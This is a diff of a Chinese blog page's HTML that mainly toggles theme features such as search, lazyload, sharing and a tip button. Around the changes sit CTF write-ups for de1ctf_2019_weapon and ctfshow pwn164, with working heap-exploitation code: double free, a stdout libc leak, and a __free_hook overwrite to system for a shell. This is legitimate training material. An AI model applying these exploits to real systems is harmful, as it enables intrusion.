@@ -35,7 +35,7 @@
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":true,"img_link":"/images/zfb.jpg","text":"请作者喝杯咖啡","icon":"/images/tea.svg"}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
     KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
@@ -45,6 +45,8 @@
 
 <body>
 <div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
     
 
     
@@ -119,9 +121,15 @@
                         </li>
                     
                     
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
                 </ul>
             </div>
             <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
                 <div class="icon-item menu-bar">
                     <div class="menu-bar-middle"></div>
@@ -273,6 +281,10 @@
         
         
         
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
     </div>
 
     
@@ -297,21 +309,41 @@
 
 <h3 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a>de1ctf_2019_weapon</h3><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#de1ctf_2019_weapon" >https://buuoj.cn/challenges#de1ctf_2019_weapon<i class="fas fa-external-link-alt"></i></a></p>
 <p>伪造fd和size拿到这个位置的chunk</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260310092650264.png" ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260310092650264.png"
+                       
+                 ></p>
 <p>然后通过该chunk，把chunk2的size改为0xd1,覆盖下面两个chunk</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260310093148085.png"  alt="image-20260310093148085"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260310093148085.png"
+                        alt="image-20260310093148085"
+                 ></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(0x50, 0, b&quot;a&quot;)</span><br><span class="line">add(0x50, 1, b&quot;a&quot; * 0x40 + p64(0) + p64(0x6f))</span><br><span class="line">add(0x50, 2, b&quot;a&quot;)</span><br><span class="line">add(0x60, 3, b&quot;a&quot;)</span><br><span class="line">add(0x50, 4, b&#x27;aaaa&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x50, 0, b&quot;\xb0&quot;)</span><br><span class="line"># dbg()</span><br><span class="line">add(0x50, 1, b&quot;a&quot;)</span><br><span class="line">add(0x50, 0, b&quot;a&quot;)</span><br><span class="line">add(0x50, 7, p64(0) + p64(0xd1))</span><br></pre></td></tr></table></figure>
 
 
 
 <p>然后把chunk23依次free，放入unsorted bin和fast bin，由于chunk2包含chunk3，可以通过malloc unsored 让chunk3的fd变为main_arena</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260310093425342.png"  alt="image-20260310093425342"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260310093425342.png"
+                        alt="image-20260310093425342"
+                 ></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">free(2)</span><br><span class="line">free(3)</span><br><span class="line">add(0x50, 8, b&quot;a&quot;)</span><br><span class="line">add(0x50, 9, b&quot;a&quot;)</span><br><span class="line">add(0x50, 10, b&quot;a&quot;)</span><br><span class="line"># dbg()</span><br></pre></td></tr></table></figure>
 
 
 
 <p>之后依旧double free ，把chunk3的fd划为可覆盖的范围内，改fd到_IO_2_1_stdout_附近，根据不同去覆盖后几位，然后修改stdout</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260310094600126.png"  alt="image-20260310094600126"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260310094600126.png"
+                        alt="image-20260310094600126"
+                 ></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">free(2)</span><br><span class="line">free(4)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">add(0x50, 2, b&quot;\x10&quot;)</span><br><span class="line">add(0x50, 4, b&quot;aaa&quot;)</span><br><span class="line">add(0x50, 2, b&quot;a&quot; * 0x48 + p64(0x61))</span><br><span class="line">add(0x50, 11, p64(0) + p64(0x71) + b&quot;\xdd\x75&quot;)</span><br><span class="line">add(0x60, 3, b&quot;a&quot;)</span><br><span class="line">add(0x60, 12, b&quot;a&quot; * 0x33 + p64(0xfbad1800) + p64(0) * 3 + b&quot;\x00&quot;)</span><br><span class="line"># dbg()</span><br><span class="line">libc_base = u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;)) - 0x3c5600</span><br><span class="line">if libc_base == 0x7f0000000000:</span><br><span class="line">    exit(-1)</span><br><span class="line">print(hex(libc_base))</span><br></pre></td></tr></table></figure>
 
 <p>之后就是覆盖malloc_hook了</p>
@@ -331,12 +363,32 @@
 
 
 
-<h3 id="ctfshow-pwn164"><a href="#ctfshow-pwn164" class="headerlink" title="ctfshow pwn164"></a>ctfshow pwn164</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330170404716.png"  alt="image-20260330170404716"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330170235538.png"  alt="image-20260330170235538"></p>
+<h3 id="ctfshow-pwn164"><a href="#ctfshow-pwn164" class="headerlink" title="ctfshow pwn164"></a>ctfshow pwn164</h3><p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330170404716.png"
+                        alt="image-20260330170404716"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330170235538.png"
+                        alt="image-20260330170235538"
+                 ></p>
 <p>delete函数中有一个uaf漏洞</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330170312293.png" ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330170312293.png"
+                       
+                 ></p>
 <p>清空ptr指针</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330170334137.png"  alt="image-20260330170334137"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330170334137.png"
+                        alt="image-20260330170334137"
+                 ></p>
 <p>realloc chunk</p>
 <blockquote>
 <p><strong><code>realloc(ptr, size)</code> 的关键逻辑</strong></p>
@@ -353,7 +405,12 @@
 <p>接着拿tar_pre的地址，用这个地址去拓展，造成堆块重叠去改main_arena的后几位去爆破</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">add(0x70,b&quot;a&quot;)</span><br><span class="line">add(0,&quot;&quot;)</span><br><span class="line">add(0x100,b&quot;a&quot;)</span><br><span class="line">add(0,b&quot;&quot;)</span><br><span class="line">add(0x20,b&quot;a&quot;)</span><br><span class="line">add(0,b&quot;&quot;)</span><br><span class="line"></span><br><span class="line">add(0x100,b&quot;a&quot;)</span><br><span class="line">for i in range(7):</span><br><span class="line">    delete()</span><br><span class="line">add(0,&quot;&quot;)</span><br><span class="line">add(0x70,b&quot;A&quot;)</span><br><span class="line">add(0x180,b&quot;a&quot;*0x78+p64(0x101)+b&quot;\x2d\xc7&quot;)</span><br><span class="line">add(0,&quot;&quot;)</span><br><span class="line">add(0x100,b&quot;a&quot;)</span><br><span class="line">add(0,&quot;&quot;)</span><br><span class="line"></span><br><span class="line">add(0x100,b&quot;a&quot;*0x33+p64(0xfbad1887) + p64(0)*3 + p8(0x58))</span><br><span class="line">libc_base = u64(p.recvuntil(b&quot;\x7f&quot;, timeout=0.1)[-6:].ljust(8, b&#x27;\x00&#x27;))-0x3ec758</span><br><span class="line">if libc_base ==-0x3ec758:</span><br><span class="line">    exit(-1)</span><br><span class="line">    </span><br><span class="line">print(hex(libc_base))</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330171801225.png"  alt="image-20260330171801225"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330171801225.png"
+                        alt="image-20260330171801225"
+                 ></p>
 <p>这里不能用<code>sudo sysctl -w kernel.randomize_va_space=0</code></p>
 <p>因为他这个偏移比较奇怪会导致_IO_2_1_stdout_和main_arena不是在同一个0x10000上，无法通过覆盖后两位过去</p>
 <p>拿到libc之后就可以通过同样的办法覆盖free_hook</p>
@@ -362,7 +419,12 @@
 <p>让realloc之后的参数为binsh的地址，并且把free_hook改为system函数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">free= libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">    system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">    one_gadget = libc_base + 0x4f322</span><br><span class="line">    zero()</span><br><span class="line">    add(0x110,b&quot;a&quot;)</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x120,b&quot;a&quot;)</span><br><span class="line">    add(0,b&quot;&quot;)</span><br><span class="line">    add(0x20,b&quot;a&quot;)</span><br><span class="line">    add(0,b&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    add(0x120,b&quot;a&quot;)</span><br><span class="line">    for i in range(7):</span><br><span class="line">        delete()</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x110,b&quot;A&quot;)</span><br><span class="line">    add(0x180,b&quot;a&quot;*0x118+p64(0x121)+p64(free-8))</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x120,b&quot;a&quot;)</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x120,b&quot;/bin/sh\x00&quot;+p64(system))</span><br><span class="line"></span><br><span class="line">    delete()</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330172347857.png"  alt="image-20260330172347857"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260330172347857.png"
+                        alt="image-20260330172347857"
+                 ></p>
 <h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">file_path = &quot;./pwn164&quot;</span><br><span class="line">remote_host = &quot;pwn.challenge.ctf.show&quot;</span><br><span class="line">remote_port = 28188</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;warn&#x27;)</span><br><span class="line"></span><br><span class="line">context.terminal = [</span><br><span class="line">    &quot;wt.exe&quot;, &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;,</span><br><span class="line">    &quot;wsl.exe&quot;, &quot;bash&quot;, &quot;-ic&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">def sla(a, b):p.sendlineafter(a, b)</span><br><span class="line">def sl(a):p.sendline(a)</span><br><span class="line">def s(a):p.send(a)</span><br><span class="line">def ru(a):p.recvuntil(a)</span><br><span class="line">def sa(a, b):p.sendafter(a, b)</span><br><span class="line">def bin_sys(libc_base) : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">def uu64() : return u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">def uu32() : return u32(p.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">def add(size, content):</span><br><span class="line">    p.recvuntil(&quot;Choice:&quot;)</span><br><span class="line">    p.sendline(&#x27;1&#x27;)</span><br><span class="line">    p.recvuntil(&quot;Size?\n&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;Content?\n&quot;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">def delete():</span><br><span class="line">    p.recvuntil(&quot;Choice:&quot;)</span><br><span class="line">    p.sendline(&#x27;2&#x27;)</span><br><span class="line"></span><br><span class="line">def zero():</span><br><span class="line">    p.recvuntil(&quot;Choice:&quot;)</span><br><span class="line">    p.sendline(&#x27;1433233&#x27;)</span><br><span class="line"></span><br><span class="line">def attack():</span><br><span class="line">    add(0x70,b&quot;a&quot;)</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x100,b&quot;a&quot;)</span><br><span class="line">    add(0,b&quot;&quot;)</span><br><span class="line">    add(0x20,b&quot;a&quot;)</span><br><span class="line">    add(0,b&quot;&quot;)</span><br><span class="line">    </span><br><span class="line">    add(0x100,b&quot;a&quot;)</span><br><span class="line">    for i in range(7):</span><br><span class="line">        delete()</span><br><span class="line">    # dbg()</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x70,b&quot;A&quot;)</span><br><span class="line">    add(0x180,b&quot;a&quot;*0x78+p64(0x101)+b&quot;\x2d\xc7&quot;)</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x100,b&quot;a&quot;)</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x100,b&quot;a&quot;*0x33+p64(0xfbad1887) + p64(0)*3 + p8(0x58))</span><br><span class="line">    libc_base = u64(p.recvuntil(b&quot;\x7f&quot;, timeout=0.1)[-6:].ljust(8, b&#x27;\x00&#x27;))-0x3ec758</span><br><span class="line">    if libc_base ==-0x3ec758:</span><br><span class="line">        exit(-1)</span><br><span class="line">        </span><br><span class="line">    print(hex(libc_base))</span><br><span class="line">    # dbg()</span><br><span class="line"></span><br><span class="line">    free= libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">    system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">    one_gadget = libc_base + 0x4f322</span><br><span class="line">    zero()</span><br><span class="line">    add(0x110,b&quot;a&quot;)</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x120,b&quot;a&quot;)</span><br><span class="line">    add(0,b&quot;&quot;)</span><br><span class="line">    add(0x20,b&quot;a&quot;)</span><br><span class="line">    add(0,b&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    add(0x120,b&quot;a&quot;)</span><br><span class="line">    for i in range(7):</span><br><span class="line">        delete()</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x110,b&quot;A&quot;)</span><br><span class="line">    add(0x180,b&quot;a&quot;*0x118+p64(0x121)+p64(free-8))</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x120,b&quot;a&quot;)</span><br><span class="line">    add(0,&quot;&quot;)</span><br><span class="line">    add(0x120,b&quot;/bin/sh\x00&quot;+p64(system))</span><br><span class="line"></span><br><span class="line">    delete()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        p=process(&quot;./pwn164&quot;)</span><br><span class="line">        # p=remote(&quot;pwn.challenge.ctf.show&quot;,28188)</span><br><span class="line">        attack()</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    except:</span><br><span class="line">        print(&quot;wrong&quot;)</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
 
 
@@ -391,8 +453,44 @@
                     </div>
                     <div>
                         
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
                     </div>
                 </div>
+
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/zfb.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="/images/tea.svg"></i>&nbsp;请作者喝杯咖啡
+    </div>
+</div>
 
                 
 
@@ -583,6 +681,19 @@
     
 
     
+        <div class="count-info info-item">
+            
+
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
 
     
 </footer>
@@ -685,6 +796,35 @@
 
     <!-- local search -->
     
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
 
     <!-- tablet toc -->
     
@@ -724,8 +864,16 @@
 
 <!-- local search -->
 
+    
+<script src="/js/local-search.js"></script>
+
+
 
 <!-- lazyload -->
+
+    
+<script src="/js/lazyload.js"></script>
+
 
 
 <div class="">
@@ -750,6 +898,10 @@
         
 
         <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
         
     
 
